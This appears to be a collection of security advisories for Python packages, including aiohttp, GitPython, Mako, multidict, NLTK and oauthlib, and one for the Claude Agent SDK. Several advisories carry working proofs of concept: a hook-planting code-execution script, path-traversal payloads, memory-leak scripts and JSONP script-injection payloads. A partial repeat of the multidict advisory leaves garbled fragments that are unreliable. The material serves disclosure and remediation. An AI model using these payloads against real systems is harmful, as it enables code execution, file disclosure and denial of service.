vulnerabilities.details:
### Summary

Multiple cases were found where aiohttp could use excessive or unbounded memory, or excessive CPU consumption on attacker controlled requests.

### Impact

An attacker could cause resource exhaustion through specially crafted requests.
vulnerabilities.summary: aiohttp: Multiple instances of excessive or unbounded memory/CPU use

vulnerabilities.details:
### Summary

The Secure attribute was not being enforced for the shared cookie.

### Impact

It may be possible to send a shared cookie marked Secure through an unencrypted request.
vulnerabilities.summary: AIOHTTP: Secure attribute not enforced for shared cookie

vulnerabilities.details:
### Summary

The keepalive timeout was not used during the initial portion of a request.

### Impact

An attacker could keep an idle connection open indefinitely before sending any data.

### Workaround

Use a reverse proxy (as recommended for all production deployments) with sensible keepalive limits.
vulnerabilities.summary: aiohttp server lacks an initial request/header timeout

vulnerabilities.details:
### Summary

An overflow in Max-Age processing can skip closing a connection.

### Impact

An attacker may be able to exhaust the connection pool temporarily, until garbage collection resolves the connections.
vulnerabilities.summary: AIOHTTP: Connector pool exhaustion via Max-Age overflow

vulnerabilities.details:
### Summary

An attacker can exhaust file descriptors with specially crafted multipart requests.

### Impact

If a handler uses `Request.post()`, it may be possible for an attacker to use an unlimited number of file descriptors, potentially resulting in resource exhaustion.
vulnerabilities.summary: AIOHTTP: File descriptor exhaustion in multipart requests

vulnerabilities.details:
### Summary

An attacker sending an absolute-form request can spoof the scheme used.

### Impact

If user code depends on the `Request.scheme` attribute for anything security related, an attacker may be able to circumvent this logic, tricking the application into thinking a connection is encrypted when it is not, or vice versa.

### Workaround

A WAF rule to reject absolute-form requests (legitimate requests should only use this form for proxies).
vulnerabilities.summary: AIOHTTP: Absolute-form request targets can spoof Request.scheme

vulnerabilities.details:
### Summary

A subdomain can remove the Host-Only flag from an existing cookie to a parent domain.

### Impact

A user accessing untrusted subdomains could see their Host-Only protections stripped from cookies. Given most usecases won't reflect these cookies to a browser, the impact is limited.
vulnerabilities.summary: AIOHTTP: Cookie from subdomain can remove Host-Only Scope from existing cookies

vulnerabilities.details:
### Summary

The pure Python parser is vulnerable to an HTTP request smuggling attack.

### Impact

If users are using the Python parser (`AIOHTTP_NO_EXTENSIONS`, or not a standard wheel installed), then an application may be vulnerable to a request smuggling attack.

### Workaround

Switch to the default C parser.
vulnerabilities.summary: AIOHTTP: Pure-Python parser request smuggling

vulnerabilities.details:
The Claude Agent SDK for Python passed the `resume` option to the Claude CLI without validation, allowing a value beginning with `-` to be interpreted as a separate CLI flag. An attacker who controlled the `resume` value could inject an `--mcp-config` flag defining a stdio MCP server, resulting in arbitrary command execution at CLI startup that bypassed the SDK's permission controls. Exploitation required an application to pass untrusted input as the session ID to resume.

Users are advised to update to the latest version of the claude-agent-sdk package.

Thank you to hackerone.com/moamenmahmood for reporting this issue.
vulnerabilities.summary: Claude Agent SDK: Argument Injection via resume Option Allows Arbitrary Command Execution

vulnerabilities.details:
### Summary


`create_submodule(name, path, url)` clones a submodule into the repo's own `.git`
directory before it rejects the path. A `path` of ".git/hooks" is accepted by the
pre-clone check, so the submodule is cloned straight into the live hooks directory,
and a file named `post-checkout` in the submodule becomes an executable
`.git/hooks/post-checkout`. On 3.2.0+ the later index check does raise `ValueError`,
but only after the clone already wrote to disk, and it does not remove the planted
hook; on 3.1.x there is no such check and the call succeeds silently. Either way the
hook runs on the next git operation (e.g. checkout), giving code execution.

### Details


The checkout path is validated too late, after the clone has already mutated disk.
This breaks the "validate before mutation" invariant that commit 43a43cd8 ("Validate
submodule checkout and metadata paths before mutation") set out to enforce.

Submodule.add() calls the permissive path check before cloning, and the strict check
only reaches the ".git" alias at index time, after _clone_repo has written to disk:

git/objects/submodule/base.py (Submodule.add)
  599: path = cls._to_relative_path(repo, path)           # accepts ".git/hooks"
  673: mrepo = cls._clone_repo(repo, url, path, name, ...) # clones into <worktree>/.git/hooks
  714: index.add([sm], write=True)                         # strict check only triggers here

git/index/base.py (IndexFile._preprocess_add_items)
  732: _validate_repo_path(entry.path)                     # rejects ".git", too late

_to_relative_path only blocks `..`/absolute/out-of-tree paths; `.git` aliases are
rejected only by _validate_repo_path, which was added in 3.2.0 (commit a75aedf3) and
runs at the index boundary. The ValueError it raises at line 732 does not roll back
what _clone_repo already wrote.

Version-dependent behavior:
- 3.2.0 .. tip bda18e08: _validate_repo_path raises ValueError at index.add, but the
  hook is already on disk and is not removed (incorrect order of validation vs. clone).
- 3.1.x (e.g. 3.1.59): _validate_repo_path does not exist and _to_relative_path does
  not reject `.git`; create_submodule(path=".git/hooks", ...) returns with no error at
  all and the hook is planted silently.

### Proof of concept


Setup:
  evilsub/ : a git repo whose ROOT contains an executable file named post-checkout (the payload)
  victim/  : a git repo with at least 1 commit and a second branch, whose .git/hooks has NO
             sample hooks (the state of a minimal/CI checkout, or `git init` with an empty
             template dir, or GIT_TEMPLATE_DIR/init.templateDir empty)

import git, os.path as osp
try:
    git.Repo("victim").create_submodule(name="x", path=".git/hooks", url=osp.abspath("evilsub"))
except ValueError:
    pass   # 3.2.0+: ".git" is rejected, but only AFTER the clone, so the plant already happened.
           # 3.1.x: no exception is raised at all; the call succeeds and still plants the hook.

#### victim/.git/hooks/post-checkout now exists, mode 0755, attacker-controlled, on every
#### affected version. Any later checkout runs it:
####  git -C victim checkout <other-branch>   ->   the hook runs   ->   code execution

Verified live:
- tip bda18e08 (3.2.0 + 3 commits): create_submodule raised ValueError from
  git/index/base.py:732, yet .git/hooks/post-checkout was present and executable, and
  `git checkout` executed it.
- 3.1.59: create_submodule returned with no error; .git/hooks/post-checkout was planted
  and executed by `git checkout`.

### Impact

Arbitrary code execution. A library/app that creates a submodule from an
attacker-influenced `path` ends up with an attacker-controlled executable in
`.git/hooks`, which git runs on ordinary later operations. This affects any service
that derives a submodule checkout path from untrusted data, e.g. one that ingests a
submodule spec (name/path/url) from a user-supplied manifest or API request and feeds
`path` into create_submodule. On 3.2.0+ the library's own validation is the thing that
fails: it correctly rejects the `.git` path, but only after the submodule has already
been cloned into place, so an app that traps the ValueError reasonably believes the
unsafe path was blocked.

Preconditions (hence AC:H): (1) the app passes an attacker-influenced submodule `path`;
(2) the target hook name is free in `.git/hooks`, true for minimal/CI/container
checkouts and whenever init.templateDir/GIT_TEMPLATE_DIR is empty. With the default
sample hooks present, `git clone` refuses the non-empty destination and no plant occurs.

Affected: all tested versions from 3.1.x (3.1.59) through the current tip bda18e08
(3.2.0 + 3 commits). 3.1.x plants silently; 3.2.0+ plants despite raising ValueError.
vulnerabilities.summary: GitPython validates a submodule's ".git" path only after cloning into it (RCE)

vulnerabilities.details:
## Summary

On Windows, a `TemplateLookup` URI beginning with a drive designator (e.g. `C:/../../secret.txt` or `C:\..\..\secret.txt`) bypasses the directory traversal check in `Template.__init__`, allowing reads of files outside the configured template directory.

This is a third, independent instance of the root cause behind CVE-2026-41205 (the `//` prefix) and CVE-2026-44307 (the backslash form). Both of those fixes normalized a separator *spelling*. Neither addressed the other way `posixpath` and `ntpath` disagree: the drive designator. Both prior fixes remain effective on their own terms; this variant survives them for an independent reason.

## Details

The root cause is the same `posixpath` / `os.path` mismatch: resolution is done with `posixpath`, confinement is checked with `os.path`, which is `ntpath` on Windows.

```
# mako/lookup.py -- resolution
247:  srcfile = posixpath.normpath(posixpath.join(dir_, u))   # posixpath, always
248:  if os.path.isfile(srcfile):                             # ntpath on Windows

# mako/template.py -- confinement
268:  u_norm = os.path.normpath(u_norm)                       # ntpath on Windows
269:  if u_norm.startswith(".."):                             # never true for a drive URI
```

`posixpath` has no concept of a drive, so it treats `C:` as an ordinary path component; the `..` segments pop `C:` and then escape the template root. `ntpath`, by contrast, splits the drive off and treats the remainder as rooted, discarding the `..` entirely -- so the guard on line 269 inspects a string from which the evidence has already been removed:

| URI | `ntpath.normpath` (what the guard sees) | guard fires |
|---|---|---|
| `//../secret.txt` | `..\secret.txt` | yes |
| `\..\secret.txt` | `..\secret.txt` | yes |
| `C:/../../secret.txt` | `C:\secret.txt` | **no** |

Because the guard cannot fire for *any* URI beginning with a single-letter drive designator, the traversal is unconstrained, and its depth does not have to be guessed. `posixpath.normpath()` saturates excess `..` segments at the root rather than erroring, so a URI carrying more `..` than the template root is deep reaches the volume root and descends from there. A single fixed payload therefore works regardless of where the template directory sits:

```
template root = <base>/srv/app/templates

'C:/../../../../boot.ini'          -> reads <base>/boot.ini
'C:/' + '../'*40 + 'etc/hostname'  -> reads /etc/hostname   (no depth guess)
'C:/../../../../../etc/hostname'   -> TopLevelLookupException (wrong depth)
```

On Windows the equivalent is `C:/../../../../../../../../Windows/win.ini`, which reads that file for any template root depth. Only a target addressed *relative* to the template root needs the `..` count to be exact; anything reachable from the volume root does not.

### Affected code

- `mako/template.py`: `Template.__init__()` URI validation uses `os.path.normpath()`, which on Windows strips the drive and discards the `..` segments before the `startswith("..")` guard is applied.
- `mako/lookup.py`: `TemplateLookup.get_template()` resolves with `posixpath.normpath`/`posixpath.join`, where `C:` is an ordinary component, then performs the existence check with `os.path.isfile()`.

### Reproduction

Windows is emulated with the technique already used by the project's own test suite (`test/test_template.py:1398-1401`):

```python
import os, ntpath
os.path = ntpath

from mako.lookup import TemplateLookup
lookup = TemplateLookup(directories=["root/tpl"])

for uri in ["ok.html",
            "//../../secret.txt",
            "\\..\\..\\secret.txt",
            "../../secret.txt",
            "C:/../../../secret.txt",
            "C:\\..\\..\\..\\secret.txt",
            "d:/../../../secret.txt"]:
    try:
        t = lookup.get_template(uri)
        print(repr(uri), "-> filename=", t.filename, repr(t.render()))
    except Exception as e:
        print(repr(uri), "-> REFUSED", type(e).__name__)
```

Against 1.4.1, with a sentinel file written outside the configured directory:

```
'ok.html'                    -> root/tpl/ok.html        'OK'         (positive control)
'//../../secret.txt'         -> REFUSED   (CVE-2026-41205 fix works)
'\..\..\secret.txt'          -> REFUSED   (CVE-2026-44307 fix works)
'../../secret.txt'           -> REFUSED
'C:/../../../secret.txt'     -> reads the sentinel
'C:\..\..\..\secret.txt'     -> reads the sentinel
'd:/../../../secret.txt'     -> reads the sentinel
```

On POSIX the same URIs are refused, because `posixpath.normpath` keeps `C:` as an ordinary component and the `..` survive to be inspected. The issue is Windows-only.

Note that `d:/../../../secret.txt` resolves relative to the template root, not to drive `D:` -- this is not a cross-drive read. Reaching another drive would require a leading `..`, which `ntpath.normpath` renders as `..\..\D:\x` and the existing guard catches.

## Impact

If an application on Windows passes user-controlled template names or include paths to `TemplateLookup.get_template()`, an attacker may load and disclose any file readable by the application process on the same volume as the template directory, not merely files adjacent to it. The primary impact is local file disclosure. If the targeted file contains Mako/Python template syntax, it may also be parsed and executed as a template.

As with CVE-2026-41205, the URI is not generally reachable through a raw URL path, since a conforming URL normalizer collapses `C:/../..` first. The relevant vectors are query strings, form and JSON bodies, route parameters, and `<%include file="${...}"/>`.

## Remediation

Normalize both sides with the same module. The resolution side already commits to `posixpath`, so the confinement check should as well:

```python
u_norm = posixpath.normpath(self.uri.replace("\\", "/").lstrip("/"))
if u_norm.startswith(".."):
    raise exceptions.TemplateLookupException(...)
```

This closes the drive case for the same reason it closes `//`: `posixpath` treats `C:` as an ordinary component, so the `..` segments survive to be inspected. Verified to block all three drive forms with the full test suite passing.

## Credit

Reported by Eurico Nicacio under coordinated disclosure.
vulnerabilities.summary: Mako: Path traversal via drive-letter URI on Windows in TemplateLookup

vulnerabilities.details:
## Description

A reference leak in the items-view union and subtraction operators of aio-libs/multidict 6.7.0 through 6.9.0 (C extension) lets a remote client drive unbounded, unreclaimable memory growth by having each operand element leak one key-identity object and one value object. The reflected-union path (`operand | d.items()`, `multidict_itemsview_or2_impl`) and the subtraction path (`d.items() - operand`, `multidict_itemsview_sub1_impl`) parse each element into new strong references but release only the tuple wrapper, never the identity and value. Servers in the aio-libs stack build these views over attacker-supplied HTTP headers and query strings, so the operand size is under remote control. Forced garbage collection does not recover the leaked objects, so resident memory rises monotonically until the process is killed.

---

## Root Cause

`_multidict_itemsview_parse_item()` returns **new** references: a fresh identity via `md_calc_identity()` and a fresh value via `Py_NewRef()`. The `or2_impl` first parse loop requests both but clears only `arg`:

```c
// views.h:565 — or2_impl first parse loop
while ((st = PyIter_NextItem(iter, &arg)) > 0) {
    int tmp = _multidict_itemsview_parse_item(
        self, arg, &identity, NULL, &value);   // identity + value: new refs
    if (tmp < 0) goto fail;
    else if (tmp > 0) {
        if (_set_add(tmp_set, identity, value) < 0) goto fail;
    }
    Py_CLEAR(arg);                             // :575 clears arg ONLY
}
```

`_set_add()` builds its own tuple with `PyTuple_Pack` and `Py_DECREF`s it, so it never borrows the loop's `identity`/`value`. On the next iteration those variables are overwritten, so the previous references are lost permanently. The `sub1_impl` first loop (`:686-696`) has the identical omission.

This is an editing slip, not an ownership contract: every sibling path clears all three references per iteration, `and1_impl` (`:304-306`), `and2_impl` (`:389-391`), `or1_impl` (`:506-508`), and the second (`md_next`) loops of both functions (`:605-607`, `:726-728`). PR #1413 added a `Py_DECREF(tpl)` to the *second* loop of `or2`/`sub1`, fixing a different temporary-tuple leak; it never touched the first parse loop, so this leak remains on `master`.

`views.h` is byte-identical between `v6.6.0` and `v6.7.0`, yet 6.6.4 does not leak and 6.7.0 does. The regression is behavioural, introduced by a key-identity ownership change in `hashtable.h` across that boundary that made `md_calc_identity()` return a fresh strong reference the unchanged parse loop never releases.

---

## Reproduction Environment

| Item | Value |
|------|-------|
| **Runtime** | CPython 3.14.6 |
| **multidict** | 6.9.0 (PyPI binary wheel, C extension) |
| **OS** | macOS (darwin 25.6.0, arm64) |

---

## Proof of Concept

### POC Source Code

#### poc_refcount.py — leak proof with intersection control

```python
import sys, gc
from multidict import CIMultiDict

def probe(name, run_op):
    d = CIMultiDict(); d["seed"] = "x"
    value = object()                 # unique sentinel
    N = 100000
    operand = [("k%d" % i, value) for i in range(N)]
    gc.collect(); before = sys.getrefcount(value)
    run_op(d, operand)
    gc.collect(); after = sys.getrefcount(value)
    print(f"[{name}] leaked strong refs = {after - before}")

probe("or2  operand | items", lambda d, o: o | d.items())    # reflected union
probe("sub1 items - operand", lambda d, o: d.items() - o)    # subtraction
probe("and2 items & operand", lambda d, o: d.items() & o)    # CONTROL: clears, expect 0
```

#### poc_dispatch.py — maps which paths leak

```python
import sys, gc
from multidict import CIMultiDict

def probe(name, fn):
    d = CIMultiDict(); d["seed"] = "x"
    v = object(); N = 50000
    operand = [("k%d" % i, v) for i in range(N)]
    gc.collect(); before = sys.getrefcount(v)
    fn(d, operand); gc.collect(); after = sys.getrefcount(v)
    print(f"{name:35s} leaked={after - before}")

probe("operand | d.items()  (or2)",  lambda d, o: o | d.items())
probe("d.items() | operand  (or1)",  lambda d, o: d.items() | o)
probe("d.items() - operand  (sub1)", lambda d, o: d.items() - o)
probe("operand - d.items()  (rsub)", lambda d, o: set(o) - d.items())
probe("d.items() & operand  (and)",  lambda d, o: d.items() & o)
```

#### poc_rss.py — availability consequence

```python
import sys, gc, resource
from multidict import CIMultiDict

def rss_mb():
    r = resource.getrusage(resource.RUSAGE_SELF).ru_maxrss
    return r / (1024 * 1024) if sys.platform == "darwin" else r / 1024

d = CIMultiDict(); d["seed"] = "x"
gc.collect(); print(f"start RSS = {rss_mb():.1f} MB")
for i in range(200):
    operand = [(f"k{i}_{j}", f"v{i}_{j}") for j in range(50000)]
    _ = operand | d.items()
    del operand
    gc.collect()                     # prove GC cannot reclaim the leak
    if (i + 1) % 40 == 0:
        print(f"after {(i+1)*50000:>9,} elements: RSS = {rss_mb():.1f} MB")
```

### Execution Steps

1. `python3 -m venv venv` (CPython 3.10+).
2. `./venv/bin/pip install "multidict==6.9.0"` (installs the C-extension wheel).
3. From a directory that is **not** a multidict checkout, run each script with `./venv/bin/python`.

### Actual Execution Evidence

```
[or2  operand | items] leaked strong refs = 100000
[sub1 items - operand] leaked strong refs = 100000
[and2 items & operand] leaked strong refs = 0        <- control
```

```
operand | d.items()  (or2)          leaked=50000
d.items() | operand  (or1)          leaked=0
d.items() - operand  (sub1)         leaked=50000
operand - d.items()  (rsub)         leaked=0
d.items() & operand  (and)          leaked=0
```

```
start RSS = 15.6 MB
after 2,000,000 elements: RSS = 288.1 MB
after 6,000,000 elements: RSS = 776.8 MB
after 10,000,000 elements: RSS = 1266.8 MB   (gc.collect() every iteration)
```

### Version-boundary evidence

Same `poc_dispatch.py`, PyPI wheels, identical environment. Last-clean is `6.6.4`; first-affected is `6.7.0`:

```
6.6.4 : or2=0      sub1=0      others=0   (clean, last 6.6.x)
6.7.0 : or2=50000  sub1=50000  others=0   (AFFECTED, first)
6.9.0 : or2=50000  sub1=50000  others=0   (affected)
```

The clean 6.6.x releases return correct set-operation results, so the zero leak reflects correct memory management, not a broken path.

### Analysis of Results

The operand holds exactly `N` references to one sentinel value; after the union its refcount rises by another `N` and stays there post-GC, so each element leaked one strong reference. Subtraction shows the identical delta. The intersection control, which clears `identity` and `value`, leaks zero; the only code difference is the two missing `Py_CLEAR` calls, so the leak is caused by that omission and not the harness. RSS climbs from 15.6 MB to 1266.8 MB (~250 MB per 2M elements) despite per-iteration GC, confirming the objects are unreachable by the cyclic collector.

---

## Impact

A process that evaluates items-view unions or subtractions over remote-influenced operands leaks one identity plus one value object per element, permanently. In the aio-libs stack multidict backs HTTP headers and query strings, so an attacker who enlarges the operand (for example, many repeated header items compared against a fixed allow/deny set) forces steady, unrecoverable heap growth and can eventually exhaust memory in a long-lived server. This is an availability defect only; results stay correct and no data is exposed.

Reachability depends on the application evaluating `operand | view.items()` (reflected union) or `view.items() - operand` (subtraction) over a sequence of 2-tuples whose count is remote-influenced. The forward union `view.items() | operand` routes to `or1_impl`, which clears correctly and does not leak; a non-tuple operand element takes the `parse_item` early-return and does not leak. Set algebra over items views is not the most common multidict usage, which bounds exposure and is why this is Medium, not High. This is distinct from PR #1413, which fixed a temporary-tuple leak in the second loop and did not release these per-element objects.

---

## Remediation

**Recommended fix.** Clear the two per-element references at the end of the first parse loop in both functions, exactly as every sibling path does. In `or2_impl` (`views.h:575`) and `sub1_impl` (`views.h:696`), replace the lone `Py_CLEAR(arg);` with:

```c
    Py_CLEAR(arg);
    Py_CLEAR(identity);
    Py_CLEAR(value);
```

This is an in-repo change to a static internal function; it alters no public API, type, or signature, and asks callers to change nothing. A leak test in the existing `tests/test_leaks.py` style would lock it in.

**Workaround.** Avoid `operand | view.items()` and `view.items() - operand` on attacker-influenced operands, or install with `MULTIDICT_NO_EXTENSIONS=1` to use the unaffected pure-Python build.

## Description

A reference leak in the items-view union and subtraction operators of aio-libs/multidict 6.7.0 through 6.9.0 (C extension) lets a remote client drive unbounded, unreclaimable memory growth by having each operand element leak one key-identity object and one value object. The reflected-union path (`operand | d.items()`, `multidict_itemsview_or2_impl`) and the subtraction path (`d.items() - operand`, `multidict_itemsview_sub1_impl`) parse each element into new strong references but release only the tuple wrapper, never the identity and value. Servers in the aio-libs stack build these views over attacker-supplied HTTP headers and query strings, so the operand size is under remote control. Forced garbage collection does not recover the leaked objects, so resident memory rises monotonically until the process is killed.

---

`_multidict_itemsview_parse_item()` returns **new** references: a fresh identity via `md_calc_identity()` and a fresh value via `Py_NewRef()`. The `or2_impl` first parse loop requests both but clears only `arg`:

```c
// views.h:565 — or2_impl first parse loop
while ((st = PyIter_NextItem(iter, &arg)) > 0) {
    int tmp = _multidict_itemsview_parse_item(
        self, arg, &identity, NULL, &value);   // identity + value: new refs
    if (tmp < 0) goto fail;
    else if (tmp > 0) {
        if (_set_add(tmp_set, identity, value) < 0) goto fail;
    }
    Py_CLEAR(arg);                             // :575 clears arg ONLY
}
```

`_set_add()` builds its own tuple with `PyTuple_Pack` and `Py_DECREF`s it, so it never borrows the loop's `identity`/`value`. On the next iteration those variables are overwritten, so the previous references are lost permanently. The `sub1_impl` first loop (`:686-696`) has the identical omission.

| **multidict** | 6.9.0 (PyPI binary wheel, C extension) |

    value = object()                 # unique sentinel
    N = 100000

    gc.collect(); before = sys.getrefcount(value)
    run_op(d, operand)
    gc.collect(); after = sys.getrefcount(value)
    print(f"[{name}] leaked strong refs = {after - before}")

### Summary

Several model-artifact APIs still treat caller-controlled model paths as ordinary filenames even when NLTK path security is enforced. The same outside-root paths are rejected by guarded helpers, but these public read and write flows still use raw file APIs.

### Details

- **Vulnerability type:** File sandbox bypass
- **Affected component:** `TransitionParser.train`, `TransitionParser.parse`, `AveragedPerceptron.save`, `AveragedPerceptron.load`, `PerceptronTagger.save_to_json`, `save_maxent_params`
- **Affected versions:** Published `3.9.4` and current source `v3.10.0-rc2` both reproduced.
- **Patched versions:** Not yet patched
- **Root cause:** Model import and export helpers use built-in `open()` on caller-controlled paths instead of pathsec-aware helpers.

`TransitionParser.train()` writes outside allowed roots, `TransitionParser.parse()` reads outside allowed roots, `AveragedPerceptron` bypasses the sandbox in both directions, and adjacent read-side helpers in the same family already show the intended guarded behavior. I confirmed outside-root reads and writes while `pathsec.open()` or the guarded sibling helpers rejected the same paths.

### PoC

**Preconditions**
- The application enables `pathsec` enforcement and lets untrusted workflows choose model import or export paths.

**Steps**
1. Enable `pathsec.ENFORCE=True` and restrict allowed roots to a dedicated sandbox directory.
2. Use public model import or export APIs with paths that point outside that root.
3. Observe the same paths are rejected by negative-control guarded helpers such as `pathsec.open()`, `PerceptronTagger.load_from_json()`, or `load_maxent_params()`.
4. Observe the vulnerable APIs still read or write outside-root files successfully.

**Minimal reproducible excerpt**

```text
transition_train_exists True
transition_parse_loader_read_bytes 13
averaged_load_keys ['bias']
maxent_save wrote ['alwayson.tab', 'labels.txt']
```

### Impact

Consumers that rely on `pathsec` for local containment can be tricked into reading or overwriting files outside approved roots through normal model persistence and loading APIs.

### Remediation

Route all model-path file access through `nltk.pathsec.open()` or existing pathsec-aware helpers, and add regression tests that pair each vulnerable API with a negative control on the same path.

### Summary

When `enable_jsonp=True`, oauthlib's `RevocationEndpoint` reflects the user-supplied `callback` parameter directly into JavaScript response bodies on both success and error paths without validating that it is a legal JSONP callback name. This allows arbitrary JavaScript response generation instead of a restricted function call, making the documented JSONP revocation feature unsafe for browser-based JSONP consumption when attackers can influence `callback`.

### Details

The issue is in `oauthlib/oauth2/rfc6749/endpoints/revocation.py`.

When `enable_jsonp=True` is passed to the `RevocationEndpoint` constructor, two code paths wrap the response body using the user-supplied `request.callback` parameter:

```python
# Error response path (line 72-73):
if self.enable_jsonp and request.callback:
    response_body = '{}({});'.format(request.callback, response_body)

# Success response path (line 81-82):
if self.enable_jsonp and request.callback:
    response_body = request.callback + '();'
```

The `request.callback` value comes from HTTP request parameters, either the query string or POST body, via the `Request` class in `oauthlib/common.py` (lines 394-395), which merges query and body parameters into `_params`. Any value the client sends as `callback` is used verbatim.

There is no validation of any kind on the callback parameter:
- No check that it is a valid JavaScript identifier
- No whitelist of allowed characters
- No escaping or sanitization

A safe JSONP implementation must validate that the callback is a legal JavaScript function name (e.g., matching `^[a-zA-Z_$][a-zA-Z0-9_$.]*$`). Without this, the attacker controls the JavaScript code returned in the response body. This is the standard mitigation used by jQuery, Express.js, Google APIs, and other major JSONP implementations.

**How the injection works:**

An attacker sends a revocation request with a crafted callback value:

```
POST /revoke HTTP/1.1
Content-Type: application/x-www-form-urlencoded

token=anything&callback=alert(document.cookie)//
```

The server responds with:

```
alert(document.cookie)//({"error": "invalid_client"});
```

This is syntactically valid JavaScript. `alert(document.cookie)` executes as a statement, and `//` comments out the rest of the line. The attacker has full control over the code that appears before the `//`.

**Execution context and attack surface:**

JSONP works by having a browser load a remote script via `<script src="...">`. The loaded script executes in the origin of the **including page**, not the remote server. This means a `<script src="https://auth.example.com/revoke?token=x&callback=payload">` tag on `evil.com` would execute the payload in `evil.com`'s context, not the auth server's context.

The impact comes from client-side integrations that consume this endpoint as trusted JSONP. If a legitimate OAuth client includes `<script src>` pointed at the revocation endpoint and an attacker can influence the callback value (e.g., via query parameter injection, a reflected value, or a man-in-the-middle downgrade), the attacker controls what code runs in the client application's origin. The authorization server becomes a source of attacker-controlled JavaScript that client applications trust and execute.

Note: the `enable_jsonp` parameter defaults to `False`, so only deployments that explicitly opt in are affected. However, this is a supported, documented library feature, not a debug flag. The client-side library includes `prepare_token_revocation_request()` with an explicit `callback` parameter (`oauthlib/oauth2/rfc6749/parameters.py`, line 174), and the documentation shows JSONP revocation as a use case (`oauthlib/oauth2/rfc6749/clients/base.py`, lines 351-358). The existing test suite tests JSONP callback reflection with a benign value (`test_revocation_endpoint.py`, lines 91-101) but does not test for injection. Deployments that enable JSONP typically do so to support older browsers or cross-origin revocation from JavaScript clients, these are exactly the environments most sensitive to script injection.

### PoC

**Requirements:** Python 3.x with oauthlib installed (`pip install oauthlib`).

```python
from oauthlib.oauth2.rfc6749.endpoints.revocation import RevocationEndpoint
from oauthlib.oauth2.rfc6749.request_validator import RequestValidator


class FailValidator(RequestValidator):
    """Auth fails -> triggers error response path (lines 72-73)."""
    def client_authentication_required(self, request, *a, **kw): return True
    def authenticate_client(self, request, *a, **kw): return False
    def authenticate_client_id(self, client_id, request, *a, **kw): return False


class PassValidator(RequestValidator):
    """Auth passes -> triggers success response path (lines 81-82)."""
    def client_authentication_required(self, request, *a, **kw): return False
    def authenticate_client_id(self, client_id, request, *a, **kw): return True
    def revoke_token(self, token, token_type_hint, request, *a, **kw): pass


payloads = [
    "alert(document.cookie)//",
    "window.location='https://evil.com/'//",
    "eval('malicious')//",
]

# --- Error path (401) ---
print("Error path (enable_jsonp=True, auth fails):")
ep_fail = RevocationEndpoint(FailValidator(), enable_jsonp=True)
for p in payloads:
    h, body, status = ep_fail.create_revocation_response(
        "https://auth.example.com/revoke", http_method="POST",
        body=f"token=x&callback={p}")
    assert p in body, "Payload not reflected"
    print(f"  [{status}] Content-Type: {h.get('Content-Type','(none)')}  Body: {body}")

# --- Success path (200) ---
print("\nSuccess path (enable_jsonp=True, revocation succeeds):")
ep_pass = RevocationEndpoint(PassValidator(), enable_jsonp=True)
for p in payloads:
    h, body, status = ep_pass.create_revocation_response(
        "https://auth.example.com/revoke", http_method="POST",
        body=f"token=x&callback={p}")
    assert p in body, "Payload not reflected"
    print(f"  [{status}] Content-Type: {h.get('Content-Type','(none)')}  Body: {body}")

# --- Control (default: enable_jsonp=False) ---
print("\nControl (enable_jsonp=False, default):")
ep_safe = RevocationEndpoint(FailValidator(), enable_jsonp=False)
_, body, status = ep_safe.create_revocation_response(
    "https://auth.example.com/revoke", http_method="POST",
    body="token=x&callback=alert(1)//")
assert "alert" not in body, "Payload should not be present"
print(f"  [{status}] {body}")
print("\nAll assertions passed.")
```

**Expected output:**

```
Error path (enable_jsonp=True, auth fails):
  [401] Content-Type: application/json  Body: alert(document.cookie)//({"error": "invalid_client"});
  [401] Content-Type: application/json  Body: window.location='https://evil.com/'//({"error": "invalid_client"});
  [401] Content-Type: application/json  Body: eval('malicious')//({"error": "invalid_client"});

Success path (enable_jsonp=True, revocation succeeds):
  [200] Content-Type: (none)  Body: alert(document.cookie)//();
  [200] Content-Type: (none)  Body: window.location='https://evil.com/'//();
  [200] Content-Type: (none)  Body: eval('malicious')//();

Control (enable_jsonp=False, default):
  [401] {"error": "invalid_client"}

All assertions passed.
```

Both paths reflect the attacker's payload verbatim into the response body.

### Impact

Any oauthlib-based authorization server that enables JSONP on the revocation endpoint (`enable_jsonp=True`) returns attacker-controlled JavaScript in its response body.

Any page or application that loads this endpoint's response as JSONP and exposes attacker influence over the `callback` parameter will execute attacker-controlled code in its own origin. If a legitimate OAuth client uses JSONP revocation (as documented by oauthlib's client-side API) and an attacker can influence the callback value, the attacker controls what code runs in the client application, including access to the client page's DOM and any data normally accessible to scripts running in that origin.

The JSONP feature is intended for legacy cross-origin browser support. Deployments that need it are typically JavaScript-heavy clients, exactly the environment most sensitive to script injection.

**Affected versions:** oauthlib >= 0.6.1 through 3.3.1 (current) and master. The unsanitized callback has been present since the revocation endpoint was first introduced in 2013 (commit `da775de`). The `enable_jsonp` gate was added in 2014 (commit `b85f89a`) but no validation of the callback value was ever added.

### Suggested fix

Validate the `callback` parameter against a strict pattern for legal JavaScript identifiers before using it in the response. Reject or ignore values that do not match:

```python
import re

# Only allow safe JSONP callback names: valid JS identifiers, optionally dot-separated
JSONP_CALLBACK_PATTERN = re.compile(r'^[a-zA-Z_$][a-zA-Z0-9_$]*(\.[a-zA-Z_$][a-zA-Z0-9_$]*)*$')

# In create_revocation_response(), before using request.callback:
if self.enable_jsonp and request.callback:
    if not JSONP_CALLBACK_PATTERN.match(request.callback):
        request.callback = None
```

This is the standard mitigation for JSONP callback injection and is the approach used by jQuery, Express.js, and Google APIs. It ensures only syntactically valid function names like `package.hello_world` are accepted, while blocking payloads like `alert(document.cookie)//`.

As a secondary hardening measure, when JSONP is enabled, the response should set `Content-Type: application/javascript` (not `application/json` or empty) to ensure correct browser handling. Currently the success path returns no Content-Type at all, and the error path returns `application/json`.

Alternatively, if JSONP is no longer considered a necessary feature, consider deprecating and removing the `enable_jsonp` option entirely. CORS is now supported by all modern browsers and is the standard mechanism for cross-origin API access.
vulnerabilities.summary: Oauthlib : Unsafe JSONP callback injection in RevocationEndpoint allows arbitrary JavaScript response generation

## Summary

A timing side-channel vulnerability exists in the PKCE (RFC 7636) implementation 
of the Authorization Code Grant flow. The `code_challenge_method_plain` function 
uses Python's standard `==` operator for string comparison instead of a 
constant-time comparison function, potentially allowing timing-based attacks.

## Affected Component

- File: `oauthlib/oauth2/rfc6749/grant_types/authorization_code.py`
- Functions: `code_challenge_method_plain`, `code_challenge_method_s256`
- Vulnerability Type: CWE-208 (Observable Timing Discrepancy)

## Technical Details

Python's `==` operator uses short-circuit evaluation when comparing strings:
1. Returns `False` immediately if lengths differ
2. Compares characters left-to-right, stopping at first mismatch

This means comparison time varies linearly with the length of the common prefix 
between the attacker-supplied verifier and the stored challenge, creating a 
measurable timing oracle.

## Proof of Concept

